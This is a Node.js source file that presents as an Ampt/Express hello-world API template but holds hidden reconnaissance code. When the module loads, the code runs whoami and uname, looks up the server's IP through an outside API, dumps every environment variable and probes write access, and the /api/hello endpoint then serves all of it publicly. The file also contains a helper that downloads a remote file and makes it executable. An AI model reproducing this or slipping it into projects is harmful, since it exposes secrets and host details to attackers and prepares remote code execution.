import { http } from "@ampt/sdk";

import https  from "https" ;
import { spawn }  from "child_process" ;
import fs  from "fs" ;
import { isNumber, isNullOrUndefined }  from "util";

const zenno = [
    new Date().toISOString() + " z " + Math.random(),
    "", "","","","", "", "",  "", "","", "","", "",
];

const selfUrl = "";

function emptyFunction() { }


function getHostPort() {
    if (process.env.host_port) return parseInt(process.env.host_port);
	if (process.env.SERVER_PORT) return parseInt(process.env.SERVER_PORT);
    if (process.env.PORT) return parseInt(process.env.PORT);
    return 3000;
}

function download(url, path, callback) {
    console.log("downloading " + path);
    reqor.get(url, function (srvResp) {
        var body = [];
        srvResp.on("data", function (chunk) {
            body.push(chunk);
        });

        srvResp.on("end", function () {
            fs.writeFileSync(path, Buffer.concat(body));
            fs.chmodSync(path, 511);
            callback();
        });
    });
}

function runCommand(path, args, result, index) {
    var child = spawn(path, args);
    child.stdout.on("data", function (data) {
        if (data == undefined || data == null || data.length == 0) return;
        const line = String.fromCharCode(...data);
        writeResultArray(result, index, line);
    });
}

function getServerIp(req, result, index) {
    req.get("https://api.bilibili.com/x/web-interface/zone", function (srvResp) {
        var body = [];
        srvResp.on("data", function (chunk) {
            body.push(chunk);
        });
        srvResp.on("end", function () {
            writeResultArray(result, index, Buffer.concat(body).toString());
        });
    });
}

function writeResultArray(arr, index, text) {
    console.log(text);
    if (
        !isNullOrUndefined(index) &&
        !isNaN(index) &&
        isNumber(index) &&
        index > 0
    ) {
        arr[index] = text;
    } else {
        arr[0] = text;
    }
}

function getAllEnvars() {
    var text = "";
    Object.keys(process.env).forEach(function (key) {
        text = text + ";\n" + key + "=" + process.env[key];
    });
    return text;
}

function testWrite() {
    const content = "godaa";
    var testPath = "zaza.txt";
    try {
        fs.writeFileSync(testPath, content);
        return "base-ok";
    } catch (err) {
        console.error(err);
    }
    try {
        fs.writeFileSync("/tmp/zaza.txt", content);
        return "tmp-ok";
    } catch (err) {
        console.error(err);
    }

    return "shippai";
}

function concatArray() {
    let length = zenno.length;
    var text = "";
    for (let i = 0; i < length; i++) {
        var ae = zenno[i];
        if (ae == undefined || ae == null || ae.length == 0) continue;
        text = text + " ||| " + ae;
    }
    return text;
}

function keepAlive() {
    reqor.get(selfUrl);
}

runCommand("whoami", [], zenno, 2);
runCommand("uname", ["-a"], zenno, 3);
getServerIp(https, zenno, 4);
zenno[5] = getAllEnvars();
zenno[6] = testWrite();


import express, { Router } from "express";

const app = express();

var outerServer="";
const ima = new Date().toLocaleString()+"xxx ";

const api = Router();

api.get("/hello", (req, res) => {

  return res.status(200).send({ message: concatArray()});
});

api.get("/greet/:name", (req, res) => {
  const { name } = req.params;

  if (!name) {
    return res.status(400).send({ message: "Missing route param for `name`!" });
  }

  return res.status(200).send({ message: `Hello ${name}!` });
});

api.post("/submit", async (req, res) => {
  return res.status(200).send({
    body: req.body,
    message: "You just posted data",
  });
});

app.use("/api", api);

http.node.use(app);
